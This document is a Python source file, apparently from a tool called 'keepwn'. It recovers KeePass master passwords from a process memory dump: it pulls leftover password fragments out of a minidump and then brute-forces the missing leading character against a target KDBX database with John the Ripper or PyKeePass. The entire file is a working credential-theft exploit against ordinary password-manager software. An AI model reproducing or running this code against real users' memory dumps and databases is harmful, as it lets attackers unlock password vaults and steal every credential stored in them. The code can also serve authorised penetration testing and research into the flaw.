import re
import os
import itertools
import subprocess
import tempfile
from os.path import exists
from pykeepass import PyKeePass
from pykeepass.exceptions import CredentialsError

import magic
from termcolor import colored

from keepwn.utils.logging import Loader, print_error, print_info, print_success, print_warning

def is_keepass_db_johnable():
    try:
        johnResult = subprocess.run(["john"], capture_output=True)
        keepassTwoJohnResult = subprocess.run(["keepass2john"], capture_output=True)

    except:
        return False

    return (johnResult.returncode == 0 and (keepassTwoJohnResult.returncode == 1 and b'Usage: keepass2john' in keepassTwoJohnResult.stderr))

def get_candidates(dump_file): # code taken from @CMEPW: https://github.com/CMEPW/keepass-dump-masterkey
    data = dump_file.read()
    candidates = []
    str_len = 0
    i = 0

    while i < len(data) - 1:
        if (data[i] == 0xCF) and (data[i + 1] == 0x25):
            str_len += 1
            i += 1
        elif str_len > 0:
            if (data[i] >= 0x20) and (data[i] <= 0xF8) and (data[i + 1] == 0x00):
                candidate = (str_len * b'\xCF\x25') + bytes([data[i], data[i + 1]])
                if not candidate in candidates:
                    candidates.append(candidate)
            str_len = 0
        i += 1

    candidates = [x.decode('utf-16-le') for x in candidates]
    if not candidates:
        return []

    groups = [[] for i in range(max([len(i) for i in candidates]))]

    for candidate in candidates:
        groups[len(candidate) - 1].append(candidate[-1])

    for i in range(len(groups)):
        if len(groups[i]) == 0:
            groups[i].append('')

    passwords = []
    for password in itertools.product(*groups):
        password = ''.join(password)
        passwords.append(password)

    return passwords

def parse_dump(options):

    if options.dump_file is None:
        print_error('Missing dump file, specify one with --dump_file')
        exit()

    if not os.path.exists(options.dump_file):
        print_error('The specified dump file does not exist')
        exit()

    dump_file_path = options.dump_file

    if not 'Mini DuMP' in magic.from_file(dump_file_path):
        print_warning('{} does not look like a minidump file, do you want to use it? [y/n]'.format(os.path.basename(dump_file_path)))
        ans = input('> ')
        if ans.lower() not in ['y', 'yes', '']:
            exit(0)

    with open(dump_file_path, 'rb') as dump_file:
        with Loader("Searching the master password in memory dump..", end="Searching for the master password in memory dump.. done!"):
            candidates = get_candidates(dump_file)

    if len(candidates) == 0:
        print_error('No candidates in the password dump, maybe KeePass 2.54+ was used by the target ?')
        exit()

    print_info('Found {} candidates:'.format(len(candidates)))

    for candidate in candidates:
        print('     ', end='')
        print(colored('＿', 'red', attrs=['bold']) + candidate)

    print()

    if not options.bruteforce:
        print_warning('Note: the two first characters still need to be determined, you can use --bruteforce to test them against an specific KDBX file.')
        exit()

    if exists(options.bruteforce):
        database_path = options.bruteforce
    else:
        print_error('The specified database does not exist')
        exit()

    if not 'KDBX' in magic.from_file(database_path):
        print_warning("{} does not look like a KeePass database, do you want to use it? [y/n]".format(os.path.basename(database_path)))
        ans = input('> ')
        if ans.lower() not in ['y', 'yes', '']:
            exit(0)

    found = False
    with Loader("Bruteforcing missing symbol with the 254 most common unicode characters..", end="Bruteforcing missing symbol with the 254 most common unicode characters.. done!") as loader:
        # If john and keepass2john binaries are installed, use those as they are much quicker, otherwise fallback to PyKeePass method
        if is_keepass_db_johnable():
            hashfile = tempfile.NamedTemporaryFile(delete=False)
            wordlist = tempfile.NamedTemporaryFile(delete=False)
            basename = os.path.basename(database_path).split('.')[0]

            for candidate in candidates:
                for char_code in range(0x0000, 0x00FF + 1):
                    try:
                        char = repr(chr(char_code))[1:-1]  # we make sure to get the escaped version of chars
                    except UnicodeEncodeError:
                        pass  # skip characters that cannot be encoded
                    wordlist.write(bytes(char + candidate + "\n", "utf-8"))
            wordlist.close()

            subprocess.run(["keepass2john", database_path], stdout=hashfile)
            hashfile.close()

            bf_result = subprocess.run(["john", "--wordlist=" + wordlist.name, hashfile.name], capture_output=True, universal_newlines=True)
            if bf_result.returncode == 0 and ('(' + basename + ')' in bf_result.stdout):
                regex = r'(.*)? \(' + re.escape(basename) + r'\)'
                current_try = re.search(regex, bf_result.stdout).group(1)
                found = True

            os.unlink(hashfile.name)
            os.unlink(wordlist.name)

        else:
            for char_code in range(0x0000, 0x00FF + 1): # unicode's Basic Latin and Latin-1 Supplement blocks
                try:
                    char = repr(chr(char_code))[1:-1]  # we make sure to get the escaped version of chars
                except UnicodeEncodeError:
                    pass  # skip characters that cannot be encoded

                for candidate in candidates:
                    current_try = char + candidate
                    try:
                        kp = PyKeePass(database_path, password=current_try)
                    except CredentialsError:
                        pass
                    else:
                        found = True
                        break
                else: # to escape the nested loops, see: https://stackoverflow.com/questions/653509/breaking-out-of-nested-loops
                    continue
                break

    if found:
        print_success('{} successfully unlocked using master password {}'.format(os.path.basename(database_path), colored(current_try, 'green')))
    else:
        print_error('No valid master password found, you should try to bruteforce with a larger charset (and a more suited tool!)')
